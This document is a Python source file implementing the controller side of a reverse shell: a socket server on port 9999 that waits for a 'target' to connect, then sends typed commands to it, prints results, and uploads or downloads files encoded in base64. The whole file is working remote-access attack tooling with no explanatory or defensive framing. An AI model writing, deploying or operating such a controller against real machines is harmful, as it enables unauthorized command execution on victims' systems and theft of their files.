import socket
import json
import base64

IP = "0.0.0.0"
PORT = 9999

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

def reliable_recv():
    data = b""
    while True:
        try:
            data += target.recv(1024)
            return json.loads(data.decode())
        except ValueError:
            continue

def server():
    global target
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(1)
    print(f"[+] Listening on {IP}:{PORT}...")
    target, addr = server.accept()
    print(f"[+] Connection from {addr}")

def run():
    while True:
        command = input(">> ")
        reliable_send(command)

        if command == "exit":
            break
        elif command.startswith("upload "):
            path = command[7:]
            try:
                with open(path, "rb") as f:
                    file_data = base64.b64encode(f.read()).decode()
                    reliable_send(file_data)
            except FileNotFoundError:
                print("[-] File not found.")
                continue
        else:
            result = reliable_recv()
            if command.startswith("download "):
                try:
                    with open(command[9:], "wb") as f:
                        f.write(base64.b64decode(result))
                        print("[+] Downloaded successfully.")
                except:
                    print("[-] Failed to download file.")
            else:
                print(result)

    target.close()

server()
run()
